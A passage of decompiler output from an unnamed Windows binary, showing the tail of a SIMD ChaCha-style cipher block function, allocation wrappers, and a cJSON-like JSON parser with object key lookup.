    v86 = _mm_add_epi32(v123, v108);
    v31 = _mm_xor_si128(v86, v18);
    v32 = _mm_xor_si128(v139, v19);
    v33 = _mm_xor_si128(v129, v22);
    v78 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v31, 0x19u), _mm_slli_epi32(v31, 7u)), 57);
    v34 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v29, 0x19u), _mm_slli_epi32(v29, 7u)), 57);
    v81 = _mm_add_epi32(v78, v111);
    v134 = _mm_add_epi32(v34, v133);
    v35 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v32, 0x19u), _mm_slli_epi32(v32, 7u)), 57);
    v112 = _mm_add_epi32(v35, v115);
    v36 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v33, 0x19u), _mm_slli_epi32(v33, 7u)), 57);
    v116 = _mm_add_epi32(v36, v119);
    v37 = _mm_xor_si128(_mm_shuffle_epi32(v92, 147), v134);
    v38 = _mm_xor_si128(_mm_shuffle_epi32(v84, 147), v112);
    v39 = _mm_xor_si128(_mm_shuffle_epi32(v30, 147), v116);
    v40 = _mm_xor_si128(_mm_shuffle_epi32(v123, 147), v81);
    v93 = _mm_or_si128(_mm_slli_epi32(v40, 0x10u), _mm_srli_epi32(v40, 0x10u));
    v120 = _mm_or_si128(_mm_slli_epi32(v37, 0x10u), _mm_srli_epi32(v37, 0x10u));
    v41 = _mm_add_epi32(_mm_shuffle_epi32(v89, 78), v120);
    v124 = _mm_or_si128(_mm_slli_epi32(v38, 0x10u), _mm_srli_epi32(v38, 0x10u));
    v99 = _mm_add_epi32(_mm_shuffle_epi32(v139, 78), v124);
    v42 = _mm_or_si128(_mm_slli_epi32(v39, 0x10u), _mm_srli_epi32(v39, 0x10u));
    v85 = _mm_add_epi32(_mm_shuffle_epi32(v86, 78), v93);
    v43 = _mm_xor_si128(v99, v35);
    v44 = _mm_xor_si128(v85, v78);
    v102 = _mm_add_epi32(_mm_shuffle_epi32(v129, 78), v42);
    v45 = _mm_xor_si128(v102, v36);
    v46 = _mm_xor_si128(v41, v34);
    v47 = _mm_or_si128(_mm_srli_epi32(v44, 0x14u), _mm_slli_epi32(v44, 0xCu));
    v48 = _mm_or_si128(_mm_srli_epi32(v46, 0x14u), _mm_slli_epi32(v46, 0xCu));
    v73 = _mm_or_si128(_mm_srli_epi32(v45, 0x14u), _mm_slli_epi32(v45, 0xCu));
    v49 = _mm_or_si128(_mm_srli_epi32(v43, 0x14u), _mm_slli_epi32(v43, 0xCu));
    v50 = _mm_add_epi32(v48, v134);
    v51 = _mm_add_epi32(v47, v81);
    v79 = v47;
    v136 = _mm_add_epi32(v73, v116);
    v52 = _mm_xor_si128(v42, v136);
    v53 = _mm_xor_si128(v93, v51);
    v95 = v51;
    v105 = v48;
    v54 = _mm_xor_si128(v120, v50);
    v131 = v50;
    v126 = _mm_add_epi32(v49, v112);
    v55 = _mm_xor_si128(v124, v126);
    v87 = _mm_or_si128(_mm_srli_epi32(v53, 0x18u), _mm_slli_epi32(v53, 8u));
    v82 = _mm_or_si128(_mm_srli_epi32(v54, 0x18u), _mm_slli_epi32(v54, 8u));
    v56 = _mm_or_si128(_mm_srli_epi32(v52, 0x18u), _mm_slli_epi32(v52, 8u));
    v57 = _mm_add_epi32(v82, v41);
    v72 = v56;
    v94 = _mm_or_si128(_mm_srli_epi32(v55, 0x18u), _mm_slli_epi32(v55, 8u));
    v58 = _mm_add_epi32(v87, v85);
    v59 = _mm_add_epi32(v94, v99);
    v60 = _mm_xor_si128(v58, v79);
    v90 = _mm_add_epi32(v56, v102);
    v61 = _mm_xor_si128(v59, v49);
    v62 = _mm_xor_si128(v90, v73);
    v63 = _mm_xor_si128(v57, v105);
    v104 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v60, 0x19u), _mm_slli_epi32(v60, 7u)), 147);
    v107 = _mm_shuffle_epi32(v58, 78);
    v74 = _mm_shuffle_epi32(v87, 57);
    v6 = _mm_shuffle_epi32(v94, 57);
    v101 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v63, 0x19u), _mm_slli_epi32(v63, 7u)), 147);
    v122 = _mm_shuffle_epi32(v57, 78);
    v5 = _mm_shuffle_epi32(v82, 57);
    v64 = _mm_or_si128(_mm_srli_epi32(v61, 0x19u), _mm_slli_epi32(v61, 7u));
    v7 = _mm_shuffle_epi32(v72, 57);
    v98 = _mm_shuffle_epi32(v64, 147);
    v118 = _mm_shuffle_epi32(v59, 78);
    v110 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v62, 0x19u), _mm_slli_epi32(v62, 7u)), 147);
    v114 = _mm_shuffle_epi32(v90, 78);
    if ( !--v3 )
      break;
    v4 = _mm_shuffle_epi32(v87, 57);
  }
  v103 = _mm_add_epi32(v101, v76);
  v65 = _mm_add_epi64(_mm_add_epi32(v5, v70), (__m128i)xmmword_42BC80);
  v66 = _mm_add_epi32(v74, v70);
  v67 = _mm_add_epi64(_mm_add_epi32(v6, v70), (__m128i)xmmword_42BC90);
  v68 = _mm_add_epi64(_mm_add_epi32(v7, v70), (__m128i)xmmword_42BCA0);
  v97 = _mm_add_epi32(v95, v75);
  v106 = _mm_add_epi32(v104, v76);
  v125 = _mm_add_epi32(v122, v71);
  v109 = _mm_add_epi32(v107, v71);
  v100 = _mm_add_epi32(v98, v76);
  v135 = _mm_add_epi32(v131, v75);
  v121 = _mm_add_epi32(v118, v71);
  v130 = _mm_add_epi32(v126, v75);
  v113 = _mm_add_epi32(v110, v76);
  v140 = _mm_add_epi32(v136, v75);
  v117 = _mm_add_epi32(v114, v71);
  if ( a1 )
  {
    v97 = _mm_xor_si128(*a1, v97);
    v106 = _mm_xor_si128(a1[1], v106);
    v109 = _mm_xor_si128(a1[2], v109);
    v66 = _mm_xor_si128(v66, a1[3]);
  }
  result = a3;
  *a3 = v97;
  a3[1] = v106;
  a3[2] = v109;
  a3[3] = v66;
  if ( a1 )
  {
    v135 = _mm_xor_si128(a1[4], v135);
    v103 = _mm_xor_si128(a1[5], v103);
    v125 = _mm_xor_si128(a1[6], v125);
    v65 = _mm_xor_si128(v65, a1[7]);
  }
  a3[4] = v135;
  a3[5] = v103;
  a3[6] = v125;
  a3[7] = v65;
  if ( a1 )
  {
    v130 = _mm_xor_si128(a1[8], v130);
    v100 = _mm_xor_si128(a1[9], v100);
    v121 = _mm_xor_si128(a1[10], v121);
    v67 = _mm_xor_si128(v67, a1[11]);
  }
  a3[8] = v130;
  a3[9] = v100;
  a3[10] = v121;
  a3[11] = v67;
  if ( a1 )
  {
    v140 = _mm_xor_si128(a1[12], v140);
    v113 = _mm_xor_si128(a1[13], v113);
    v117 = _mm_xor_si128(a1[14], v117);
    v68 = _mm_xor_si128(v68, a1[15]);
  }
  a3[12] = v140;
  a3[13] = v113;
  a3[14] = v117;
  a3[15] = v68;
  return result;
}
// 403260: could not find valid save-restore pair for ebp
// 42BC80: using guessed type __int128 xmmword_42BC80;
// 42BC90: using guessed type __int128 xmmword_42BC90;
// 42BCA0: using guessed type __int128 xmmword_42BCA0;

//----- (00403BC0) --------------------------------------------------------
void *sub_403BC0()
{
  return &unk_430A78;
}

//----- (00403BD0) --------------------------------------------------------
void *__cdecl sub_403BD0(size_t Size)
{
  return malloc(Size);
}

//----- (00403BF0) --------------------------------------------------------
void *__cdecl sub_403BF0(void *Block, size_t Size)
{
  return realloc(Block, Size);
}

//----- (00403C00) --------------------------------------------------------
void __thiscall sub_403C00(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // eax
  _DWORD *v3; // edi

  v1 = this;
  if ( this )
  {
    do
    {
      v2 = v1[3];
      v3 = (_DWORD *)*v1;
      if ( (v2 & 0x100) == 0 )
      {
        if ( v1[2] )
        {
          sub_403C00();
          v2 = v1[3];
        }
        if ( (v2 & 0x100) == 0 && v1[4] )
        {
          off_42F940(v1[4]);
          v2 = v1[3];
        }
      }
      if ( (v2 & 0x200) == 0 )
      {
        if ( v1[8] )
          off_42F940(v1[8]);
      }
      off_42F940(v1);
      v1 = v3;
    }
    while ( v3 );
  }
}
// 42F940: using guessed type int (__cdecl *off_42F940)(_DWORD);

//----- (00403C80) --------------------------------------------------------
int __thiscall sub_403C80(_BYTE *this)
{
  int v1; // esi
  unsigned int v2; // edi
  unsigned __int8 v3; // al
  int v4; // eax
  int v5; // eax

  v1 = 0;
  v2 = 0;
  while ( 1 )
  {
    v3 = this[v2];
    if ( (unsigned __int8)(v3 - 48) > 9u )
      break;
    v4 = v3 - 48;
LABEL_8:
    v5 = v1 + v4;
    v1 = 16 * v5;
    if ( v2 >= 3 )
      v1 = v5;
    if ( ++v2 >= 4 )
      return v1;
  }
  if ( (unsigned __int8)(v3 - 65) <= 5u )
  {
    v4 = v3 - 55;
    goto LABEL_8;
  }
  if ( (unsigned __int8)(v3 - 97) <= 5u )
  {
    v4 = v3 - 87;
    goto LABEL_8;
  }
  return 0;
}

//----- (00403CE0) --------------------------------------------------------
char __usercall sub_403CE0@<al>(int a1@<edx>, _BYTE *a2@<ecx>, _DWORD *a3)
{
  unsigned int v5; // eax
  unsigned int v6; // ebx
  int v7; // eax
  _BYTE *v8; // edx
  char result; // al
  unsigned __int8 v10; // ch
  char v11; // ah
  unsigned __int8 v12; // cl
  int v13; // edx
  char v14; // al
  _BYTE *v15; // edx
  char v16; // [esp+Fh] [ebp-1h]

  if ( a1 - (int)a2 < 6 )
    return 0;
  v5 = sub_403C80(a2 + 2);
  v6 = v5;
  if ( v5 >= 0xDC00 && v5 <= 0xDFFF )
    return 0;
  if ( v5 - 55296 > 0x3FF )
  {
    v16 = 6;
  }
  else
  {
    v16 = 12;
    if ( a1 - (int)(a2 + 6) < 6 )
      return 0;
    if ( a2[6] != 92 )
      return 0;
    if ( a2[7] != 117 )
      return 0;
    v7 = sub_403C80(a2 + 8);
    if ( (unsigned int)(v7 - 56320) > 0x3FF )
      return 0;
    v6 = (v7 & 0x3FF | ((v6 & 0x3FF) << 10)) + 0x10000;
  }
  if ( v6 < 0x80 )
  {
    v8 = (_BYTE *)*a3;
    result = v16;
    *(_BYTE *)*a3 = v6 & 0x7F;
    *a3 = v8 + 1;
    return result;
  }
  if ( v6 < 0x800 )
  {
    v10 = 2;
    v11 = -64;
    v12 = 1;
    goto LABEL_20;
  }
  if ( v6 < 0x10000 )
  {
    v10 = 3;
    v11 = -32;
    v12 = 2;
    goto LABEL_20;
  }
  if ( v6 > 0x10FFFF )
    return 0;
  v10 = 4;
  v11 = -16;
  v12 = 3;
LABEL_20:
  v13 = *a3 + v12;
  do
  {
    --v13;
    v14 = v6 & 0x3F;
    v6 >>= 6;
    *(_BYTE *)(v13 + 1) = v14 | 0x80;
    --v12;
  }
  while ( v12 );
  v15 = (_BYTE *)*a3;
  result = v16;
  *(_BYTE *)*a3 = v6 | v11;
  *a3 = &v15[v10];
  return result;
}
// 403DFB: conditional instruction was optimized away because ch.1 is in (2..4)

//----- (00403E20) --------------------------------------------------------
int __fastcall sub_403E20(int a1, int *a2)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  _BYTE *v4; // edi
  _BYTE *v5; // esi
  unsigned int v6; // ebx
  int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // ecx
  int v10; // eax
  _BYTE *v11; // ecx
  int v12; // eax
  unsigned __int8 v13; // bl
  char v14; // dl
  int result; // eax
  int v17; // [esp+10h] [ebp-10h]
  int v18; // [esp+14h] [ebp-Ch]
  int v19; // [esp+14h] [ebp-Ch]
  _BYTE *v21; // [esp+1Ch] [ebp-4h] BYREF

  v2 = a2;
  v3 = *a2;
  v17 = a2[2];
  v18 = *a2;
  v4 = (_BYTE *)(*a2 + v17 + 1);
  v5 = v4;
  if ( *(_BYTE *)(*a2 + v17) != 34 )
    goto LABEL_35;
  v6 = a2[1];
  v7 = 0;
  v8 = v17 + 1;
  v21 = 0;
  if ( v17 + 1 < v6 )
  {
    v9 = v17 + 2;
    while ( *v5 != 34 )
    {
      if ( *v5 == 92 )
      {
        if ( v9 >= v6 )
          goto LABEL_34;
        ++v5;
        v7 = (int)(v21 + 1);
        ++v8;
        ++v21;
        ++v9;
      }
      else
      {
        v7 = (int)v21;
      }
      ++v8;
      ++v5;
      ++v9;
      if ( v8 >= v6 )
        goto LABEL_12;
    }
    v7 = (int)v21;
LABEL_12:
    v3 = v18;
  }
  if ( (unsigned int)&v5[-v3] >= v6 )
  {
LABEL_34:
    v2 = a2;
LABEL_35:
    if ( v4 )
      v2[2] = &v4[-*v2];
    return 0;
  }
  else
  {
    v2 = a2;
    if ( *v5 != 34 )
      goto LABEL_35;
    v10 = ((int (__cdecl *)(_BYTE *))a2[4])(&v5[-v3 - v17 - v7 + 1]);
    v19 = v10;
    if ( !v10 )
      goto LABEL_35;
    v11 = (_BYTE *)v10;
    v21 = (_BYTE *)v10;
    if ( v4 < v5 )
    {
      while ( 1 )
      {
        if ( *v4 == 92 )
        {
          v13 = 2;
          if ( v5 - v4 < 1 )
          {
LABEL_33:
            v2 = a2;
            ((void (__cdecl *)(int))a2[5])(v19);
            goto LABEL_35;
          }
          v14 = v4[1];
          switch ( v14 )
          {
            case '"':
            case '/':
            case '\\':
              *v11++ = v14;
              v21 = v11;
              break;
            case 'b':
              *v11++ = 8;
              v21 = v11;
              break;
            case 'f':
              *v11++ = 12;
              v21 = v11;
              break;
            case 'n':
              *v11++ = 10;
              v21 = v11;
              break;
            case 'r':
              *v11++ = 13;
              v21 = v11;
              break;
            case 't':
              *v11++ = 9;
              v21 = v11;
              break;
            case 'u':
              v13 = sub_403CE0((int)v5, v4, &v21);
              if ( !v13 )
                goto LABEL_33;
              v11 = v21;
              break;
            default:
              goto LABEL_33;
          }
          v12 = v13;
        }
        else
        {
          *v11++ = *v4;
          v21 = v11;
          v12 = 1;
        }
        v4 += v12;
        if ( v4 >= v5 )
        {
          v2 = a2;
          v10 = v19;
          break;
        }
      }
    }
    *v11 = 0;
    *(_DWORD *)(a1 + 16) = v10;
    result = 1;
    *(_DWORD *)(a1 + 12) = 16;
    v2[2] = &v5[-*v2 + 1];
  }
  return result;
}

//----- (00404040) --------------------------------------------------------
_DWORD *__userpurge sub_404040@<eax>(unsigned int a1@<edx>, char *a2@<ecx>, double a3@<st0>, int a4, int a5)
{
  int v5; // eax
  _DWORD *v6; // esi
  char *v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // ecx
  int v10; // eax
  bool v11; // zf
  int *p_Str1; // edx
  char *Str1; // [esp+4h] [ebp-1Ch] BYREF
  unsigned int v15; // [esp+8h] [ebp-18h]
  unsigned int v16; // [esp+Ch] [ebp-14h]
  int v17; // [esp+10h] [ebp-10h]
  __int64 v18; // [esp+14h] [ebp-Ch]
  int (*v19)(); // [esp+1Ch] [ebp-4h]

  v17 = 0;
  if ( a2 )
  {
    if ( a1 )
    {
      Str1 = a2;
      v15 = a1;
      v16 = 0;
      v18 = *(_QWORD *)&off_42F93C;
      v19 = off_42F944[0];
      v5 = off_42F93C(40);
      v6 = (_DWORD *)v5;
      if ( v5 )
      {
        *(_OWORD *)v5 = 0i64;
        *(_OWORD *)(v5 + 16) = 0i64;
        *(_QWORD *)(v5 + 32) = 0i64;
        v7 = Str1;
        if ( !Str1 )
          goto LABEL_18;
        v8 = v16;
        if ( v16 )
          goto LABEL_18;
        v9 = v15;
        if ( v15 > 4 )
        {
          v10 = strncmp(Str1, &Str2, 3u);
          v9 = v15;
          v7 = Str1;
          v11 = v10 == 0;
          v8 = v16;
          if ( v11 )
          {
            v8 = v16 + 3;
            v16 += 3;
          }
        }
        if ( v7 )
        {
          if ( v8 < v9 )
          {
            while ( 1 )
            {
              v11 = v8 == v9;
              if ( v8 >= v9 )
                break;
              if ( (unsigned __int8)v7[v8] > 0x20u )
              {
                v11 = v8 == v9;
                break;
              }
              v16 = ++v8;
            }
            if ( v11 )
              v16 = v8 - 1;
          }
          p_Str1 = (int *)&Str1;
        }
        else
        {
LABEL_18:
          p_Str1 = 0;
        }
        if ( sub_404130(p_Str1, (int)v6, a3) )
          return v6;
        sub_403C00(v6);
      }
    }
  }
  return 0;
}
// 42F93C: using guessed type int (__cdecl *off_42F93C)(_DWORD);
// 42F944: using guessed type int (*off_42F944[2])();

//----- (00404130) --------------------------------------------------------
int __usercall sub_404130@<eax>(int *a1@<edx>, int a2@<ecx>, double a3@<st0>)
{
  int v5; // ecx
  int v6; // edx
  int result; // eax
  int v8; // ecx
  int v9; // ecx
  unsigned int v10; // ecx
  int v11; // edx
  char v12; // al
  unsigned int v13; // edx
  unsigned int v14; // ecx
  char v15; // cl
  char *v16; // ecx
  double v17; // xmm1_8
  bool v18; // cf
  int v19; // eax
  char *v20; // [esp+Ch] [ebp-4Ch] BYREF
  double v21; // [esp+10h] [ebp-48h]
  char v22[64]; // [esp+18h] [ebp-40h] BYREF

  if ( !a1 )
    return 0;
  v5 = *a1;
  if ( !*a1 )
    return 0;
  v6 = a1[2];
  if ( v6 + 4 <= (unsigned int)a1[1] && !strncmp((const char *)(v6 + v5), "null", 4u) )
  {
    *(_DWORD *)(a2 + 12) = 4;
    result = 1;
    a1[2] += 4;
    return result;
  }
  v8 = a1[2];
  if ( v8 + 5 <= (unsigned int)a1[1] && !strncmp((const char *)(v8 + *a1), "false", 5u) )
  {
    *(_DWORD *)(a2 + 12) = 1;
    result = 1;
    a1[2] += 5;
    return result;
  }
  v9 = a1[2];
  if ( v9 + 4 <= (unsigned int)a1[1] && !strncmp((const char *)(v9 + *a1), "true", 4u) )
  {
    *(_DWORD *)(a2 + 12) = 2;
    result = 1;
    *(_DWORD *)(a2 + 20) = 1;
    a1[2] += 4;
    return result;
  }
  v10 = a1[2];
  if ( v10 >= a1[1] )
    return 0;
  if ( *(_BYTE *)(v10 + *a1) == 34 )
    return sub_403E20(a2, a1);
  v11 = *a1;
  v12 = *(_BYTE *)(v10 + *a1);
  if ( v12 != 45 && (unsigned __int8)(v12 - 48) > 9u )
  {
    if ( *(_BYTE *)(v10 + v11) == 91 )
      return sub_404380(a2, a1);
    if ( *(_BYTE *)(v10 + v11) == 123 )
      return sub_404510(a2, (int)a1);
    return 0;
  }
  v20 = 0;
  if ( !v11 )
    return 0;
  v13 = 0;
  while ( 2 )
  {
    v14 = v13 + a1[2];
    if ( v14 < a1[1] )
    {
      v15 = *(_BYTE *)(v14 + *a1);
      switch ( v15 )
      {
        case '+':
        case '-':
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
        case 'E':
        case 'e':
          goto LABEL_26;
        case '.':
          v15 = 46;
LABEL_26:
          v22[v13++] = v15;
          if ( v13 >= 0x3F )
            break;
          continue;
        default:
          goto LABEL_27;
      }
    }
    break;
  }
LABEL_27:
  v22[v13] = 0;
  sub_417B5B((int)v22, &v20);
  v16 = v20;
  v21 = a3;
  if ( v22 == v20 )
    return 0;
  v17 = v21;
  v18 = v21 < 2147483647.0;
  *(double *)(a2 + 24) = v21;
  if ( v18 )
  {
    v19 = 0x80000000;
    if ( v17 > -2147483648.0 )
      v19 = (int)v17;
  }
  else
  {
    v19 = 0x7FFFFFFF;
  }
  *(_DWORD *)(a2 + 20) = v19;
  *(_DWORD *)(a2 + 12) = 8;
  a1[2] += v16 - v22;
  return 1;
}
// 404130: using guessed type char var_40[64];

//----- (00404380) --------------------------------------------------------
int __fastcall sub_404380(int a1, int *a2)
{
  int *v3; // ebx
  unsigned int v4; // eax
  int v5; // edi
  int v6; // ecx
  unsigned int v7; // edi
  unsigned int v8; // eax
  unsigned int v9; // edx
  bool v10; // zf
  int v11; // eax
  int v12; // edi
  unsigned int v13; // eax
  unsigned int v14; // edx
  int v15; // edx
  unsigned int v16; // eax
  unsigned int v17; // ecx
  unsigned int v18; // edi
  int result; // eax
  _DWORD *v21; // [esp+10h] [ebp-4h]

  v3 = 0;
  v21 = 0;
  v4 = a2[3];
  if ( v4 >= 0x3E8 )
    return 0;
  v5 = a2[2];
  v6 = *a2;
  a2[3] = v4 + 1;
  if ( *(_BYTE *)(v6 + v5) != 91 )
    return 0;
  v7 = v5 + 1;
  a2[2] = v7;
  v8 = v7;
  if ( v6 )
  {
    v9 = a2[1];
    if ( v7 < v9 )
    {
      while ( 1 )
      {
        v10 = v8 == v9;
        if ( v8 >= v9 )
          break;
        if ( *(_BYTE *)(v6 + v8) > 0x20u )
        {
          v10 = v8 == v9;
          break;
        }
        a2[2] = ++v8;
      }
      if ( v10 )
        a2[2] = --v8;
    }
  }
  if ( v8 >= a2[1] )
  {
    a2[2] = v8 - 1;
    return 0;
  }
  if ( *(_BYTE *)(v6 + v8) == 93 )
  {
LABEL_39:
    --a2[3];
    if ( v21 )
      v21[1] = v3;
    *(_DWORD *)(a1 + 8) = v21;
    result = 1;
    *(_DWORD *)(a1 + 12) = 32;
    ++a2[2];
  }
  else
  {
    a2[2] = v8 - 1;
    while ( 1 )
    {
      v11 = ((int (__cdecl *)(int))a2[4])(40);
      if ( !v11 )
        break;
      *(_OWORD *)v11 = 0i64;
      *(_OWORD *)(v11 + 16) = 0i64;
      *(_QWORD *)(v11 + 32) = 0i64;
      if ( v21 )
      {
        *v3 = v11;
        *(_DWORD *)(v11 + 4) = v3;
      }
      else
      {
        v21 = (_DWORD *)v11;
      }
      v3 = (int *)v11;
      v12 = *a2;
      v13 = a2[2] + 1;
      a2[2] = v13;
      if ( v12 )
      {
        v14 = a2[1];
        if ( v13 < v14 )
        {
          while ( v13 < v14 )
          {
            if ( *(_BYTE *)(v12 + v13) > 0x20u )
              goto LABEL_25;
            a2[2] = ++v13;
          }
          if ( v13 == v14 )
            a2[2] = v13 - 1;
        }
      }
LABEL_25:
      if ( !sub_404130() )
        goto LABEL_37;
      v15 = *a2;
      if ( *a2 )
      {
        v16 = a2[2];
        v17 = a2[1];
        if ( v16 < v17 )
        {
          while ( v16 < v17 )
          {
            if ( *(_BYTE *)(v15 + v16) > 0x20u )
              goto LABEL_33;
            a2[2] = ++v16;
          }
          if ( v16 == v17 )
            a2[2] = v16 - 1;
        }
      }
LABEL_33:
      v18 = a2[2];
      if ( v18 >= a2[1] )
        break;
      if ( *(_BYTE *)(v15 + v18) != 44 )
      {
        if ( *(_BYTE *)(v18 + v15) == 93 )
          goto LABEL_39;
        break;
      }
    }
    if ( !v21 )
      return 0;
LABEL_37:
    sub_403C00(v21);
    return 0;
  }
  return result;
}
// 404130: using guessed type int sub_404130(void);

//----- (00404510) --------------------------------------------------------
int __fastcall sub_404510(int a1, int a2)
{
  int *v3; // ebx
  unsigned int v4; // eax
  unsigned int v5; // edi
  unsigned int v6; // ecx
  int v7; // edx
  unsigned int v8; // edi
  unsigned int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // edi
  int v13; // edx
  unsigned int v14; // eax
  unsigned int v15; // ecx
  int v16; // edx
  unsigned int v17; // eax
  unsigned int v18; // ecx
  unsigned int v19; // eax
  unsigned int v20; // ecx
  int v21; // edx
  unsigned int v22; // eax
  int v23; // edx
  unsigned int v24; // eax
  unsigned int v25; // ecx
  unsigned int v26; // edi
  int result; // eax
  _DWORD *v29; // [esp+10h] [ebp-4h]

  v3 = 0;
  v29 = 0;
  v4 = *(_DWORD *)(a2 + 12);
  if ( v4 >= 0x3E8 )
    return 0;
  v5 = *(_DWORD *)(a2 + 8);
  v6 = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a2 + 12) = v4 + 1;
  if ( v5 >= v6 )
    return 0;
  v7 = *(_DWORD *)a2;
  if ( *(_BYTE *)(*(_DWORD *)a2 + v5) != 123 )
    return 0;
  v8 = v5 + 1;
  *(_DWORD *)(a2 + 8) = v8;
  v9 = v8;
  if ( v7 && v8 < v6 )
  {
    while ( 1 )
    {
      v10 = v9 == v6;
      if ( v9 >= v6 )
        break;
      if ( *(_BYTE *)(v7 + v9) > 0x20u )
      {
        v10 = v9 == v6;
        break;
      }
      *(_DWORD *)(a2 + 8) = ++v9;
    }
    if ( v10 )
      *(_DWORD *)(a2 + 8) = --v9;
  }
  if ( v9 >= v6 )
  {
    *(_DWORD *)(a2 + 8) = v9 - 1;
    return 0;
  }
  if ( *(_BYTE *)(v7 + v9) == 125 )
  {
LABEL_57:
    --*(_DWORD *)(a2 + 12);
    if ( v29 )
      v29[1] = v3;
    *(_DWORD *)(a1 + 8) = v29;
    result = 1;
    *(_DWORD *)(a1 + 12) = 64;
    ++*(_DWORD *)(a2 + 8);
  }
  else
  {
    *(_DWORD *)(a2 + 8) = v9 - 1;
    while ( 1 )
    {
      v11 = (*(int (__cdecl **)(int))(a2 + 16))(40);
      v12 = v11;
      if ( !v11 )
        break;
      *(_OWORD *)v11 = 0i64;
      *(_OWORD *)(v11 + 16) = 0i64;
      *(_QWORD *)(v11 + 32) = 0i64;
      if ( v29 )
      {
        *v3 = v11;
        *(_DWORD *)(v11 + 4) = v3;
      }
      else
      {
        v29 = (_DWORD *)v11;
      }
      v3 = (int *)v11;
      v13 = *(_DWORD *)a2;
      v14 = *(_DWORD *)(a2 + 8) + 1;
      *(_DWORD *)(a2 + 8) = v14;
      if ( v13 )
      {
        v15 = *(_DWORD *)(a2 + 4);
        if ( v14 < v15 )
        {
          while ( v14 < v15 )
          {
            if ( *(_BYTE *)(v13 + v14) > 0x20u )
              goto LABEL_26;
            *(_DWORD *)(a2 + 8) = ++v14;
          }
          if ( v14 == v15 )
            *(_DWORD *)(a2 + 8) = v14 - 1;
        }
      }
LABEL_26:
      if ( !sub_403E20(v12, (int *)a2) )
        goto LABEL_55;
      v16 = *(_DWORD *)a2;
      if ( *(_DWORD *)a2 )
      {
        v17 = *(_DWORD *)(a2 + 8);
        v18 = *(_DWORD *)(a2 + 4);
        if ( v17 < v18 )
        {
          while ( v17 < v18 )
          {
            if ( *(_BYTE *)(v16 + v17) > 0x20u )
              goto LABEL_34;
            *(_DWORD *)(a2 + 8) = ++v17;
          }
          if ( v17 == v18 )
            *(_DWORD *)(a2 + 8) = v17 - 1;
        }
      }
LABEL_34:
      *(_DWORD *)(v12 + 32) = *(_DWORD *)(v12 + 16);
      *(_DWORD *)(v12 + 16) = 0;
      v19 = *(_DWORD *)(a2 + 8);
      v20 = *(_DWORD *)(a2 + 4);
      if ( v19 >= v20 )
        break;
      v21 = *(_DWORD *)a2;
      if ( *(_BYTE *)(*(_DWORD *)a2 + v19) != 58 )
        break;
      v22 = v19 + 1;
      *(_DWORD *)(a2 + 8) = v22;
      if ( v21 && v22 < v20 )
      {
        while ( v22 < v20 )
        {
          if ( *(_BYTE *)(v21 + v22) > 0x20u )
            goto LABEL_43;
          *(_DWORD *)(a2 + 8) = ++v22;
        }
        if ( v22 == v20 )
          *(_DWORD *)(a2 + 8) = v22 - 1;
      }
LABEL_43:
      if ( !sub_404130(v12, a2) )
        break;
      v23 = *(_DWORD *)a2;
      if ( *(_DWORD *)a2 )
      {
        v24 = *(_DWORD *)(a2 + 8);
        v25 = *(_DWORD *)(a2 + 4);
        if ( v24 < v25 )
        {
          while ( v24 < v25 )
          {
            if ( *(_BYTE *)(v23 + v24) > 0x20u )
              goto LABEL_51;
            *(_DWORD *)(a2 + 8) = ++v24;
          }
          if ( v24 == v25 )
            *(_DWORD *)(a2 + 8) = v24 - 1;
        }
      }
LABEL_51:
      v26 = *(_DWORD *)(a2 + 8);
      if ( v26 >= *(_DWORD *)(a2 + 4) )
        break;
      if ( *(_BYTE *)(v23 + v26) != 44 )
      {
        if ( *(_BYTE *)(v26 + v23) == 125 )
          goto LABEL_57;
        break;
      }
    }
    if ( !v29 )
      return 0;
LABEL_55:
    sub_403C00(v29);
    return 0;
  }
  return result;
}
// 404130: using guessed type int __fastcall sub_404130(_DWORD, _DWORD);

//----- (00404720) --------------------------------------------------------
_DWORD *__fastcall sub_404720(int a1, unsigned __int8 *a2)
{
  _DWORD *result; // eax
  unsigned __int8 *v3; // ebx
  _BYTE *v4; // esi
  int v5; // edi
  int v6; // eax
  int v7; // edi
  int v8; // esi
  int v9; // esi
  unsigned __int8 *v10; // [esp+Ch] [ebp-8h]
  _DWORD *v11; // [esp+10h] [ebp-4h]

  v10 = a2;
  if ( !a1 )
    return 0;
  if ( !a2 )
    return 0;
  result = *(_DWORD **)(a1 + 8);
  v11 = result;
  if ( !result )
    return 0;
  while ( 1 )
  {
    v3 = (unsigned __int8 *)result[8];
    v4 = a2;
    if ( !v3 )
      goto LABEL_11;
    if ( a2 == v3 )
      goto LABEL_14;
    v5 = tolower(*a2);
    if ( v5 == tolower(*v3) )
      break;
LABEL_9:
    v8 = tolower((unsigned __int8)*v4);
    v9 = v8 - tolower(*v3);
    result = v11;
    if ( !v9 )
      goto LABEL_14;
    a2 = v10;
LABEL_11:
    result = (_DWORD *)*result;
    v11 = result;
    if ( !result )
      return result;
  }
  while ( *v4 )
  {
    v6 = (unsigned __int8)*++v4;
    ++v3;
    v7 = tolower(v6);
    if ( v7 != tolower(*v3) )
      goto LABEL_9;
  }
  result = v11;
LABEL_14:
  if ( !result[8] )
    return 0;
  return result;
}

//----- (004047E0) --------------------------------------------------------
void __usercall sub_4047E0(unsigned int a1@<edx>, char *a2@<ecx>, double a3@<st0>)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v5; // ebx
  _DWORD *v6; // eax
  unsigned __int8 *v7; // edi
  unsigned __int8 *v8; // edx
  int v9; // eax
  _BYTE *v10; // esi
  int v11; // edx
  unsigned int v12; // ebx
  int v13; // eax
  int v14; // ecx
  _DWORD *v15; // eax
  char *v16; // ecx
  char *v17; // edx
  char v18; // al
  _DWORD *v19; // eax
  char *v20; // ecx
  char *v21; // edx
  char v22; // al
  _DWORD *v23; // eax
  _DWORD *v24; // eax
